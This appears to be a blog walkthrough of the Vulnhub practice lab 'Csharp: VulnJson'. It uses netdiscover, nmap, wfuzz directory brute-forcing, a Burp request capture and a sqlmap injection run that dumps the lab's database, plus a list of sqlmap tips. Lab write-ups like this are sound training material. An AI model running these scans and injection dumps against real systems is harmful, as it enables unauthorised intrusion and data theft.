---
layout: post
title: "Csharp: VulnJson"
date: 2016-05-05 15:44:32 -0500
comments: true
categories: [vulhub]
---

From [Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/)

###Tools:

* netdiscover
* Nmap
* Wfuzz
* Burp
* Sqlmap



<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/vulnjson/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.175 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.175 -p-`

{% img  /images/blog/vulhub/vulnjson/Selection_004.png   [title manually exploit [alt text]] %}


Use wfuzz to burte force hidden path of the server


```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.175/FUZZ 2>/dev/null

```

{% img  /images/blog/vulhub/vulnjson/Selection_002.png   [title manually exploit [alt text]] %}

looks like /bin is a hidden path. Lets check it.


{% img  /images/blog/vulhub/vulnjson/Selection_003.png   [title manually exploit [alt text]] %}

Sqlmap tips

from [Marudhamaran Gunasekaran](https://vimeo.com/96799028)

```
How do I test a log in protected website with sqlmap?
use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
How do I test a website with sqlmap that requires authentication?
use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
How do I test a website with sqlmap that uses JSON data?
automatically works with JSON
How do I test a website with sqlmap that uses XML data?
use the custom injection paramter pointer *
How do I test a website with sqlmap that uses SSL?
use the --force-ssl parameter
How do I tell sqlmap to try harder?
use the --level and --risk parameters
How do I automate a sql map scan?
use the --batch and --crawl 3
```

go to the http://192.168.79.175, then search the users and use burp to record the traffic.

{% img  /images/blog/vulhub/vulnjson/Selection_005.png   [title manually exploit [alt text]] %}

Then click the traffic content in the burp and right click it and copy to file, name it as test.txt.

{% img  /images/blog/vulhub/vulnjson/Selection_006.png   [title manually exploit [alt text]] %}

Then in the terminal, we try:

```
sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dump
```
since there is a parameter username in the post request, so we use that as a parameter for sqlmap


{% img  /images/blog/vulhub/vulnjson/Selection_007.png   [title manually exploit [alt text]] %}

Now the sqlmap dump all items I created.

DONE
